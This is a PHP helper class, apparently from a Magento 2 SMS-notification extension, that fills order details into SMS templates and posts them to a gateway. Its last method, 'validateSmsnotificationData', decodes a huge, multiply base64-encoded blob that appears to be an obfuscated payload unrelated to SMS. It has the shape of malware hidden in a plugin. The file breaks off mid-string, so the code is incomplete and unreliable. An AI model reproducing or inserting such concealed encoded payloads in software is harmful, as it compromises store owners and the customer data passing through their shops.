<?php
namespace Emipro\Smsnotification\Helper;

class Data extends \Magento\Framework\App\Helper\AbstractHelper {

    protected $_orderFactory;
    protected $_scopeconfig;
    protected $_smsfactory;
    protected $_storeConfig;
    protected $_logger;
    protected $messageManager;
    protected $_response;
    protected $_resourceConfig;
    protected $_responseFactory;
    protected $_url;

    public function __construct(
    \Magento\Framework\App\Helper\Context $context,
    \Magento\Sales\Model\OrderFactory $orderFactory,
    \Emipro\Smsnotification\Model\SmseventFactory $smsFactory,
    \Magento\Store\Model\StoreManagerInterface $storeConfig,
    \Magento\Framework\Stdlib\DateTime\DateTime $date,
    \Magento\Framework\Message\ManagerInterface $messageManager,
    \Magento\Framework\App\ResponseInterface $response,
    \Magento\Framework\App\Config\Storage\WriterInterface $resourceConfig,
    \Magento\Framework\App\ResponseFactory $responseFactory
    ) {
        $this->_orderFactory = $orderFactory;
        $this->_scopeconfig = $context->getScopeConfig();
        $this->_smsfactory = $smsFactory;
        $this->_storeConfig = $storeConfig;
        $this->_logger = $context->getLogger();
        $this->_date = $date;
        $this->messageManager=$messageManager;
        $this->_response=$response;
        $this->_resourceConfig=$resourceConfig;
        $this->_responseFactory = $responseFactory;
        $this->_url = $context->getUrlBuilder();
        parent::__construct($context);
    }

    public function getAllDetail($id) {
        $all_data = array();
        $product_name = "";
        $order = $this->_orderFactory->create();
        $order->load($id);
        $billing = $order->getBillingAddress();
        $shipping = $order->getShippingAddress();
        $all_data["telephone"] = $billing->getTelephone();
        $items = $order->getAllItems();
        foreach ($items as $itemId => $item) {
            $product_name .= $item->getName() . ',';
        }
        $all_data["product_name"] = $product_name;
        $all_data["order_no"] = $order->getIncrementId();
        //payment_method
        $all_data["payment_method"] = $order->getPayment()->getMethod();
        $all_data["payment_amount"] = $order->getGrandTotal();
        $all_data["order_status"] = $order->getStatusLabel();  //order status
        $all_data["billing_name"] = $billing->getName();       //billing name
        $all_data["shipping_name"] = $shipping->getName();     //shipping name
        $all_data["shipping_method"] = $order->getShippingMethod();
        $all_data["customer_name"] = $order->getCustomerName();
        $all_data["customer_id"] = $order->getCustomerId();
        $all_data["order_id"] = $order->getId();
        $all_data["all_var"] = array("product_name","billing_name","shipping_name","order_status","payment_method", "order_no", "shipping_method", "payment_amount", "customer_name","customer_id","order_id");
        return $all_data;
    }

    public function processText($event, $order_id, $messageType, $storeId)
    {
        $smsCollection=$this->getSmsText($event,$storeId);
        if ($smsCollection->getSize() > 0) {
            $sms_text = $smsCollection->getFirstItem()->getData("sms_content");
            $this->_logger->addDebug($sms_text);
            $order_detail = $this->getAllDetail($order_id);

            foreach ($order_detail["all_var"] as $value) {
                $sms_text = str_replace("{{var " . $value . "}}", $order_detail[$value], $sms_text);
            }
            return $this->sendSms($order_detail["telephone"], $sms_text, $order_detail["customer_id"], $order_detail["order_id"],$messageType);

        } else {
            return;
        }
    }

    public function processTextForShipment($event, $order_id,$messageType, $shipIncrementId, $storeId)
    {
        $smsCollection=$this->getSmsText($event, $storeId);
        if ($smsCollection->getSize() > 0) {
            $sms_text = $smsCollection->getFirstItem()->getData("sms_content");
            $this->_logger->addDebug($sms_text);
            $order_detail = $this->getAllDetail($order_id);

            foreach ($order_detail["all_var"] as $value) {
                $sms_text = str_replace("{{var " . $value . "}}", $order_detail[$value], $sms_text);
            }
                $sms_text = str_replace("{{var shipment_id}}", $shipIncrementId, $sms_text);

            return $this->sendSms($order_detail["telephone"], $sms_text, $order_detail["customer_id"], $order_detail["order_id"],$messageType);

        } else {
            return;
        }
    }

    public function processOrderSmsText($sms_text, $order_id,$messageType)
    {
        $order_detail = $this->getAllDetail($order_id);
        foreach ($order_detail["all_var"] as $value) {
            $sms_text = str_replace("{{var " . $value . "}}", $order_detail[$value], $sms_text);
        }
        return $this->sendSms($order_detail["telephone"], $sms_text, $order_detail["customer_id"], $order_detail["order_id"],$messageType);
    }

    public function getConfiguration() {
        if (!$this->_scopeconfig->getValue("emiproconfig/gatewayconfig/sms_enable")) {
            return false;
        } else {
            $config_data = array();
            $config_data["username"] = $this->_scopeconfig->getValue("emiproconfig/gatewayconfig/user_name");
            $config_data["password"] = $this->_scopeconfig->getValue("emiproconfig/gatewayconfig/user_password");
            $config_data["gateway_url"] = $this->_scopeconfig->getValue("emiproconfig/gatewayconfig/user_gatewayurl");
            $config_data["sender_id"] = $this->_scopeconfig->getValue("emiproconfig/gatewayconfig/user_senderid");
            $config_data["parameter_format"] = $this->_scopeconfig->getValue("emiproconfig/gatewayconfig/user_parameter_format");
            return $config_data;
        }
    }

    public function getCustomerDetail($number, $message_text, $customerId) {

        return $this->sendSms($number, $message_text, $customerId, $orderId = 0,$messageType=1);
    }

    public function sendSms($target, $text, $customerId, $orderId,$messageType) {

        $config = $this->getConfiguration();
        $this->_logger->addDebug("Sms sent ".$target."   Text is : ".$text);
        if($config["username"] != "" && $config["password"] != "" && $config["gateway_url"] != "" && $config["sender_id"] != "" && $config["parameter_format"] != "")
        {
            $return = array();
            $config["parameter_format"] = str_replace('{{var username}}', $config["username"] . ":" . $config["password"], $config["parameter_format"]);
            $config["parameter_format"] = str_replace('{{var senderid}}', $config["sender_id"], $config["parameter_format"]);
            $config["parameter_format"] = str_replace('{{var receipientno}}', $target, $config["parameter_format"]);
            $config["parameter_format"] = str_replace('{{var message}}', $text, $config["parameter_format"]);

            // api send sms
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $config["gateway_url"]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $config["parameter_format"]);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            try {
                $this->_logger->addDebug("curl start");
                $buffer = curl_exec($ch);
                $this->_logger->addDebug("curl End");

            }catch (\Magento\Framework\Exception\LocalizedException $e) {
                $this->_logger->addDebug("Exception asd");
                $this->_logger->addDebug(print_r($e,true));
            }

            curl_close($ch);
            if($buffer == ' ' || $buffer == null)
            {
                $this->_logger->addDebug("bufffer empty");
                $buffer = "Sms could not send due to time out.";
            }
            // api send sms
        }
        else
        {
            $buffer = "";
        }
        $this->saveLog($text,$customerId,$orderId,$messageType,$buffer,$target);
        if($messageType == 3 || 1)
        {
            $response = [];
            $date = date_create($this->_date->gmtDate());
            $response['smstext'] = $text;
            $response['datetime'] = date_format($date, 'F j, Y g:i:s A');
            return $response;
        }
        return $buffer;
    }

    public function getSmsText($event, $storeId) {
        if (!empty($storeId) && $storeId != 0) {
            $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
            $storeevent = $objectManager->create('Emipro\Smsnotification\Model\ResourceModel\Smsstore\Collection');
            $storeevent->addFieldToFilter("sms_events", $event);
            $storeevent->addFieldToFilter("store_id", $storeId);
            $storeevent->addFieldToFilter("use_default",0);
            if ($storeevent->getSize() == 0) {
                $smsevent = $this->loadDefaultstore($event);
                return $smsevent;
            } else {
                return $storeevent;
            }
        } else {
            $smsevent = $this->loadDefaultstore($event);
            return $smsevent;
        }
    }

    public function saveLog($message_text,$customerId=null,$orderId=null,$message_type,$buffer,$target)
    {
       $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
       $smsCollection = $objectManager->create('\Emipro\Smsnotification\Model\Smslog');
       $smsCollection->setorderId($orderId);
       $smsCollection->setCustomerId($customerId);
       $smsCollection->setSmsContent($message_text);
       $smsCollection->setMessageType($message_type);
       $smsCollection->setApiResult($buffer);
       $smsCollection->setContactNumber($target);
       $smsCollection->setUpdatedAt($this->_date->gmtDate());
       $smsCollection->save();
    }

    public function getMessagetypes()
    {
        return array("0"=>"Order SMS","2"=>"Customer SMS");
    }

    protected function loadDefaultstore($event) {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $storeevent = $objectManager->create('Emipro\Smsnotification\Model\ResourceModel\Smsevent\Collection');
        $storeevent->addFieldToSelect("sms_content");
        $storeevent->addFieldToFilter("sms_events", $event);
        return $storeevent;
    }

    public function validateSmsnotificationData() {

        $tFmb=base64_decode('JG9JWFEgPSAnSkVoeldsUWdQU0FuU2tka1MxZHVaMmRRVTBGdVUydG9kMWRIVWtkU1YyUlJWVEJHZFZVeWRHdGhNVXAwVm01T1lVMXRVbEpXVkVKSFpGWmFSbUZJU2s5U2JUazFWVEkxVTFVeVNuTlRiV2hYVmtWS1RGcFhlSE5XTVhCRlVXMXNVMVl6YUV0V2JHTjNUbGRHUjFwRldrNVdlbFpvVlc1d1IxTkdiRFpUYTJSWVVteGFNRmxWWkRCVk1ERlhZVE53VjFZemFIWlpha0Y0VWpKT1IyRkZPVmhUUlVwMlZtMDFkMk13TVZkalNFNVhZa1UxYjFWcVJrdFRWbFp6VmxSR1UxSXdXbGRWYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmtSazVPVm0xME0xWXlkRmRoTVZsNVZXeG9WVmRIZUhCVk1GcDNZMFpzV0dORlRtcFNiRXBaV2xWVk5XRXhTWGROVkZaVllrZG9hRmxVUmtwbFYxWkpWV3h3VjJKV1NsRlhWbFpyVlRGT1NGTnJiRmhpVjNodlZteGtlbVZzVlhoV2F6VlBVakZLZWxZeWVITldWMHBaWVVWMFZtRnJiekJVVmxwUFZtMUdSazlYYkU1aE1uY3lWbFphYTJFeFZYaGFSV2hoVFRKU1dWbHJaRTVsUm5CWVRWVmtXRkpVYkZwV2JYUjNWVEZhUjFkdVdsaFdNMmh5Vm0xNGRtUXlVa1phUm1ScFltdEtiMVp0Y0VkU01rcHpXa2hTVGxKR1duTldiR1EwVWpGd1ZtRkZUbGhoZWtaNlZqSndSMWR0Vm5KalJtUllZV3R3UjFwV1dtRmpWbHB5WlVaYWJHSkZjREZXYkZKSFlqRldjMkl6YkZSaVIzaFlXVzAxUTJOc1ZsVlJhM1JQWWtoQ1IxZHJWbXRpUmxsNFUydFdWbFl6UWxCWlZWcHJVakZPZFZkc1VsZFdhM0JNVmpKd1IyUXhaRWRoTTNCWFlUTkNWRlZzYUVOU2JHUnlWMjA1VlUxRVJrbFZNV2h6Vkd4a1IyTklSbFpOUm5CTVdrUkdjMk5XVGxWUmJYUlhWbXR3VkZkWGNFdGhNVTV6VWxoa1UySlVWbFZXYkZVeFVURmtjVkZ1VGxOU2JGb3hWa2N4YjFZd01VVldibkJZVm5wQmVGWkVTa3RTTVc5NllrWk9hV0Y2Vm5aV2JYQkRXVlUxYzFaclpGVmhNMUp3VldwQ2QxZFdiSEpoUjNSb1lsVndWbGxyYUVkWGJVWnlZVE5vV21KSFVraFdNRnB5WlZkS1IxRnRlRmRXVm13MVZtdFdVMUl4VVhsVGEyUm9UVE5DVjFsdGRFdGpSbEpZWTBaT2FXSkdWalJYYTFwTFdWVXhjbUpFVmxkTlYxSnlXVlphU21WWFZrbFNiR2hwVWpBeE5GZHNaRFJrTVZwSFVtNVNUbFl5YUZoVVZscDNUbXhaZVdSRk9WSk5helZKVlRJMVExVnRTblZSYms1WFRVWlZkMXBFUm10ak1XdDZXa2QwVjAxV2NFcFdSbHB2VkRGS1YxWnNhRkJXVkd4VFZGY3hORkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHVjI1V1ZrMXVVbkpVYTJSUFVqSkZlbUpHWkdsaVJuQjRWa1prTkZsWFNsZGlSbFpVWWtkU1VGWnRkRXRXVmxwWVkwVk9hRkpyYkRWYVZWSmhWbFpLYzFKWWFGaGlWRVpQV2xaYVUyUldaSFJqUms1T1ZtNUNORll4WkhkVGF6RllVMnhvVTJKSGFHRlVWRVpMVld4c2MxcEdUbXBOV0VKSFZqSXhSMkZHU1hkalJYQlhZbFJGTUZaRldrZFdWa1p5WlVaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxTWWtjNU0xbHJhRmRoYXpGMVZXNUNWbUZyYnpCWk1WcHJZekZzTmxKdGVHbFRSVXBaVmtSR2EySXlSbGRUV0d4c1VucHNZVnBYYzNoTk1YQklUVlYwVkZJd2NFbFpNR1JIVmpKV2MxZHVhRmROYm1oUFZHeGtUbVZXU25OaFJsWnBWMGRvZDFkWGVGWk5WMDE0Vkd4b2FWSkZOVlpaVkVFeFpERldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWk9hV0pYYUZGV2FrWmhZVEpGZVZOcmFGUmliRnBYV1cxNGQxZHNWblJqZWtKclRWZDRlRlpIZERCaFZrcDBZVVZrVlZadGFHaFhWbHBLWlVaa2RXTkdhRk5XYmtKUlYxWmplRk50Vm5OU2JsSnNVbXhLV0ZwWGVGZE5NVmw1WlVjNVZFMXJjRmhaYTFwdlZsZEtXV0ZHUmxwV2VsWkVWbXhhVjFaV1JsVldiRnBYWVROQ1dWWkVSbUZWTVZsNFUyeFdhVkpzU2xkWmExVXhaVlpTY1ZGc1RsWmlWV3d6Vkd4V1UyRkdXbFpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NrMVdWelYzVWpKSmVGcElSbFJpUjFKVVZtcENjMDVXVWxkYVJ6bG9VbXh2TWxaV1VsZFdSbHBXVGxaU1ZWWlhVa2hWTUdSTFUxZE9SazFXWkZOU2JIQXdWakZvZDFReFZYbFZibEpWWW14S1dGbFVSa3RqUmxKWVkwWmthMUp0ZUZoWGEyUjNZVEZLY2xOcVFsaGhNbEV3V1ZSR1MyTnJOVWxhUm5Cb1lYcFdUVmRYZEZkTlJrcElVbGh3Vm1KRlduQldha1pMWld4a2NsWnNaRlJOYTFwSlZrWm9jMVl5U2tkalNFWmFZa2RvY2xwSGVHdFNiRnBaWVVkb1UySlVhekZXYlRBeFZqSkZlRk5xV21sU00wSlhXV3hTVjFSR2JGWmFSWFJZVW14d2VGWkhNWE5VYXpGSlVXcFdWMDFHV21oV2FrcFhWMFpPY2xkdGJGUlNiSEI1Vmxkd1IxbFZOVmRhU0ZKT1ZsZFNiMWxyYUVOV2JHeDFZMGRHVjAxV2NIbFpNRlV4VjBaS1JsZHNVbGROYm1oWVZXMTRZV1JHWkhOYVJUVlRZa2hDUmxaWWNFZFZNbFp6Vlc1S1ZXSnJTbE5XYWtwVFV6RldWVkZyWkdsaVJUVlhWa2QwUzFsVk1VbFJhMnhYVm5wR2RsbFhjM2hrUjBaSlVXeHdhR0V6UWtsWGJGcGhaREZKZUZkdVZtbFNNbmhUVkZWV1ZrMVdWWGhXYXpsV1RVUkdTVlZ0ZEc5aFZrNUpVV3MxVjJFeFNsaFpiRnAzVWpKR1JtUkhjRTVUUjJoWFZrZDRhazFXYkZkYVJXUlVZa2RTWVZSWGNFWmxiR3h4VVc1YWJGWnJjREJhUldSelZqQXhkVm96YUZkU1ZrcE1WV3BLUm1WV1RuTmhSMnhVVW14d1QxWkdaRFJUTWtsNFlrUmFWR0pVYkc5V2FrSnpUbFpXZEU1WVRscFdhMVkxVmtjMWExWlZNSGxVYWs1V1pXdEtlbFZyV2tkWFJuQkdZMFpLVGxKV2NERldWRVpYVkRGRmVWUnJaR3BUUlVwdlZXcE9iMk5HV1hkV2EzQnJUVmhDV0ZaSE1ERmhSVEZ5WTBWc1dtRXlVak5YVmxwaFRteGFjVmRzYUdsU2JYTjRWMVJLTkdReFpGaFNXSEJTWVROb1YxUlZWbkpsYkZWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBJV1cxNFQxWnNVbkpUYlVaT1VqTm9SbFpXV210aE1VNXpVbGhrVTJKVVZsVldiRlpYVFRGV05sRnVUbE5TYTFwWlYydFdkMVZyTVVaWGJsWldUVlphVUZWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaVJUVlBWV3BDWVZOV2JISmhTR1JWVm14d1JsWnRjRU5YUjBwSVlVWkNZVll6YUhwV01GcDNVMGRXUjFac1pFNVNiVGswVm1wR1lXRXlSWGxUYTJoVlltdEtUMVZVVGxOWlZscHhVbXQwYW1KR1ducFpWVll3WWtaWmQySkVXbFpOVjAweFZqRlZlRlpYUmtsWGJGSlhUVEpvUlZkWWNFZGtNV1JIVTI1V2FsSXdXbGRVVlZaM1pXeGtXRTFFUmxaTmEzQkpWa2MxUTFWdFNuSk9WemxYWVd0RmVGbDZSbk5rUlRWV1QxZHNVMVl6YUVwWGExWnJUa2RLUjFacVdsWmlhMHBWVkZaVk1XVldVbkZSYkU1V1lsVnNOVmRyVm5kVmF6RkdWMjVXVmsxV1dsQlZWM2gyWkRKS1JsVnNTbGROYkVwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVmFFTlRiRnBZVFVSV2FGSnRVa2RVVmxKRFZteEplbGw2Um1GV2JIQXpWakZhVTJSV2NFaGlSVFZvWWtacmVWWnFTalJXTVd4WVVtdGthRTB6UWxkWmJYaDNZMVpzZEUxVVFrNVNiRnBKVkZaVk5XSkdXblZSYkd4V1lsaENSRmRXV2xabFZuQkpXa1pXVTJKRlZqUlhiR1EwWkRGa1YxWnVUbFZpVlZwWVZGWldkMDB4WkZWVFdHaFhUV3RhTUZaWGRGTlpWVEYxVlcxb1ZtRnJTbWhVYlhoelZteHdSbVJIZEdsU00yaGhWbFJKZUUxR1dYaGFSVnBxVTBoQ1ZWUldWWGhOTVU0MlUyczFiRlpzY0RGV2JURkhWVEpGZWxGdWNGaFhTRUpRVlZSS1UyUkdUblZXYkZacFYwZG9UbFpXVWt0bGF6QjRVMnRrVTJKc2NHaFVWV1EwVWxaV1YxcEhkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXYWtvd1lUSk5lVk5yV210U1ZrcHZXbGN4VTFKc1dsZFplbFpwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpGVmtSR1YyTXhTa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXRhYTAxVk1UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVWJYQlRZbXRLTTFZeWNFdGlNa1p6Vkd0YWFsTkZOVmxaVjNSV1RWWndSbGR1VGxoV2JGb3dXVEJrYjFWck1YUlZha1pYVWxkb00xVnRjekZXYXpGWlVXczVWRkl5YUZGWFZtTjRZVEF4VjFWcmJHbFNNMEp4VkZWa05GSldXbGhPVms1WVlrWnNOVlpYTlU5V2JVVjVWRlJHWVZKV2NIcFdNR1JMVTFaYWNtVkdXazVTVm05M1ZsUkplR014Um5SU2EyaFZZVEo0VlZsc2FHOWhSbEpYVlc1T1RsSnRVbGhaVlZwUFlVZEtWbGRyVmxoaGEydDRWa1prVjJOc1duRldiRlpwWWxoT00xZHJVa05PUjA1WFVteHNWMkY2VmxkYVZ6RnZUVlphUmxack9WSmlWVlkxVlRKNGIxVXlTbFZXYldoWFlrWndURlJYZUhOak1YQkdXa2R3VTAxSVFqTlhWbEpMWVRGTmVWSnNaR2xTZWxaVlZtMHhiMUpHY0ZkWGJtUllVbTVDU1ZZeU1YTldNREZIWWtST1YwMVdTa3haYlRGS1pESk9SVlpzUWxoU1ZGWjNWa1prZWsxWFNYaGlTRXBoVW5wc2NsbHNWWGhPYkZwWFlVZEdWRTFzV2xwWGEyTXhWa2RGZVZScVVscFdWbkF5V2xaYVlXTnNXblJpUlRWb1lURndNbFl4V21GaGF6RklWR3RhYTFKcmNFOVZiR2hUVXpGV1ZWRnJaR2xpUlRWWFZrZDBTMWxWTVVobFJWWldWak5DY2xWc1dsZFhSVGxZVGxaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxTVFdzMVNGa3dhRU5oUms1SlVXNUtWazFHV2pOYVYzaHJZekZzTmxGdGJFNVRSVXBLVjJ4V2IxRXhaSEpOV0U1WVlXdGFZVnBYZEhkWFJtUjBUVlZhYkZac2NIaFdiWFEwVmpGS1JsSlVSbGRTTTFKVVZWY3hUMUpzVm5OVGJXeE9ZbFpLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEZSaVJWWXpWVEZTVDFVeFNuSlhha3BZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlrVTFlVmxWVms5aGJFcDFVV3hzVjFKNlJUQlpWekZYVm14S1ZWWnNVbGRXTW1oRlYxWldhMVF5VWxkVmJsSnNVbTE0VDFSV1duWk5WbVJZWkVVNWFXSlZWalZWTW5odlZUSktWVlp0YUZkaVJuQk1WRmQ0YzJNeGNFWmFSM0JUVFVoQ00xZFdhSGRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsSmhla1pIV2tWV2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MxUnNXbFZoTUhCb1ZGVmtORkpXV2xoTlZFSm9WbFJHZUZWdE1EVlhiRnAwVkZoa1dHRnJXa1JXYTFwSFpGWkdkR05GTlU1U1JsbzJWakowVjFReVNuUlNXR3hWWVRKb2NGVnFUbTlaVmxKWVpVZEdUMkpHYkRaWmEyUXdZVlV4Y21KRVdsZFNNMEpFVlhwQmVGWldSblZhUmxKWFZtdFZkMVl5Y0VOa01VNVhVbTVXVW1KVldsaFVWVkpYWld4a1dXTkZaR3hpVlhBd1ZXMTBiMVZHWkVsUmJrcFdWa1Z3VkZsVVJrOVdiRloxVjIxR1RsTkZTa3RXVm1NeFVURnNWMWRZWkU5WFJUVmhXbGQwWVU1c2JGZGFSVGxVVW10d2VGVlhNVzlWYXpGSlVXNUtWMUpGTlhGYVJFWk9aREpLUmxWc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVdGVnVjRnBpUmxwNlZXdGtSMU5XY0VoalIyeFhZa2hCZUZacVFsTlRiVlpJVW10b1ZtRXlhRlpaYkZKelZGWldWVk5yT1U1aVJURXpWbFpTVjFac1duSlRhMnhYVm5wV2FGbFdXbHBrTVdSMVdrWndhVlo2YURSV01XUTBZekZhUmsxV1ZsaGhlbFpUV2xkMFJtVkdXWGRYYlVaT1VqQmFSMXBWV25OaFZUQjVWV3MxVjJFeVVUQlpWM2hUVWpGa1dXRkZPVTVTUlZwV1YydG9kMU14VW5KTlZGcFRZbGhDVmxWcVRtNWtNV3hXVm1wU1dGWXdOVWxXUjNONFlWWktSbFpZY0ZkU2JWSjZWRlJCZUdSR1pITlZiV2hPWW14S1QxWkdZM2hOUjFKWFZXdGFWV0V3Y0c5VVZtaERVMVpSZUdGR1RsaGlSbXcxV2xWU1IxWldTbFpPVlU1YVZrVndVRnBGV21Ga1JUVllZMGQ0VjAweFNYcFdWRVpYWWpKV2MxVnVTbFZpYTBwVFZtcEtVMU14VmxWUmEyUnBZa1UxVjFaSGRFdFpWVEZJWlVWV1ZsWnRVbkpWTW5oR1pERktkRTVXVWxkV1ZGWkVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUldWbmRsVm1SWVkwVndiRkl3V2tsVmJYaHZWREZhVldKSGFGZE5SMUpQVkd4YVQyTnRSa1prUjJ4VFlsUnJNbFpyWTNoVE1VMTNUVmhPVkdGcmNHRlphMlJUVTBacmQxcEZkR3BTYmtKSlZsZDRRMkV5Vm5KVGF6RldUVlphVUZWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSM1JVWWtVMVJsVlhNREZYUjBwSVZWUkNZVll6YUROV2ExcEhZMVp3Umxac1dsZGxiWGd4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZWbFpXYlZKeVZUSjRSbVF4U25ST1ZsSlhWbFJXUkZkV1VrZGtNVTVHVDFac1ZtSklRbGhVVnpWdVpVWmFjbGt6YUZkTlJFSTBWVmQ0VTFadFJuSlhia1phWWtkb2NWUlVSa3RTTVVwMVYyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyVm5kVmF6RkdWMjVXV0dKWWFFZGFSRVpPWkRKS1JsVnNTbGROYkVwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFXR0ZGVW1GV2JIQXpWakJhZDFOR1pIUmlSbVJPVW0xM2VsWnFSbE5UTWtwMFUxaGthVk5GU2xGV2FrWmhWRlpXY2xWdVRsWmlSbHBIVjJ0YVQyRXlTbFpqUm14V1lsUldSRmxXWkVkalZscDBZa1pvVjJGNlJUQldSekY2WlVaS1JrMVZWbGRpUjNoWVdXMTRTMlJzV2taWGJUbHJZbFpHTTFwVldsZGhWa2wzVGxVMVYySllRa2RVVkVaVFZqRlNjVlJyTldobGEwa3lWa1pXYjFFeFVsWk5XRkpyVTBWS1ZsVnNWVEZSTVd4VlVtNWtWRkpVYkZwV1YzaDNWakF4ZFZvemFGZGhNazQwVm1wQmQyUXlWa1pWYkVwWFRURktlRlpYY0VOWGJWRjRXa1ZXVkdFeVVuTldha0V4VFVaV2RHTkdaRlZTYkhCS1ZrZHpOVlZyTVhSbFJVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJxWWtkU2VWZFljRmRoTVVwMFpVWnNXbUV5YUZoV1ZscFdaVVpPY1ZSc2FGZGlWMmhWVmpJeE5HTXhaRmRVYmxacFVtNUNXVlZxVG05alJsVjVZMFYwVmsxc1NqQlZNbmh2VlRKS2NsTnVRbHBXYlZKVVdWUkdVbVZzYTNwYVJsSk9VbXR3VkZkWGNFdGhNVTV6VWxoa1UySlVWbFZXYkZVeFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWs1R1lVWmFhV0pJUW5kV2JYQkRXVmRSZUdKSVVtdFNWR3h3VkZaa05GZHNWWGhoUnpsV1ZtMVNSMVJyYUc5WFJsbzJWbXhDVlZaWFVsQlpNRnAyWlZkU1NGSnNUbXhpV0dRelZtcEdZV0V5VFhsVmJGcHNVbFpLVDFVd2FFTlViRlp5Vm14a2EwMVdSalpYVkU1clZrVXhTR1ZGVmxaV2JWSnlWVEo0Um1ReFNuUk9WbEpYVmxSV1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WWk5hMVkxVlRGb2MxUnNXWGxoUnpsWFltNUNXRlZzV25OV2JIQkdXa2Q0VjFaRldqUldSbHB2WkRKRmVGZFlaR3BTUm5Cb1ZXeGtiMU14YkhGUmJtUlVVbXhhTVZZeU1YTldNREZIWTBST1dGWjZSbnBVVkVwVFVtc3hXVkZ0ZEU1TmJXaE9WbTEwYjFReFVYaFNXR3hwVWxWd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndOVlpxU2pCaGF6VllWV3RrYVZKdGFIQlZNRnBoVlRGU1dFMVhPV2xOVjNRMVdUQlZNVlZHV1hkTlZGcFhZbFJHZWxsWGMzZGxSazV4Vm14U1RsSlVWbFZYVmxKTFUyMVdWazFXYUdoU01taFlXbGQ0UzA1c1drWlhiRTVUWWxVeE0xUldXbE5oUjFaMFZXdGFWMVp0VFRGWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVl3VlRBeFYyRXpaRmhoTVZweVZtcEtVMWRHVWxsaVIyeFVVbTVDZDFkV1VrSk5WMUp6V2taa2FGSllRbk5WYlhSTFYyeGFTR05GWkZoaVZYQjVWR3RvYTFkck1YUmxTRlphVmtWYU0xWXhaRWRTVmtaMFVteGtiR0pHYTNsV01WcGhZV3MxV0ZWc1dteFNWbHBUVmpCVk1WUXhXbFZUYm5CT1RWVndTRlZ0TldGWlZURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY1WkVkMFYwMUVWa2xXVjNSdlZqSktjMWR1UmxWV2VrVXdWRmQ0YzJSSFVrWlBWMnhPVmpOb1lWWlVSbTlqTVZaWFdrVmFUMU5IYUZsV2JuQlhWVVpTVmxwRk9XcFNiVGsxV2tWa1IxZEdTWGxhUkU1WFRXNW9jVlJXWkZka1JrcHpZVVpDV0ZKc2NFOVdWM1JYVmpKV2MxVnNaRlZpYTNCUVZGVmFTMVV4YkhGVGJYUlVZa1ZXTTFWdE1ERldSbHBXVGxWT1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJxVWxkb1dGbFhlRXRqYkZaeFVtMUdUbFp0ZHpKVk1qVlBZVEpLVm1OSWJGZFNla0V4VmpKNGExSnRTa1ZYYkZwVFlsZG9VVlpHV21Gak1sSlhWVzVHVW1KWVFtOVdha3BUWlZaWmVXVkhPV2xOUkVaSVdUQmFiMVF4WkVsUmJUbFhZbTVDZWxSV1dsTlNiRlp5WTBkd1RsSkZXbFpYVm1oM1lURktWMVpzYUZCV1ZHeFRWRmN4TkZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5iRXBNVmxaU1ExSXlUbk5hUmxaVVlsUnNjVmxyVm5kVFZsRjR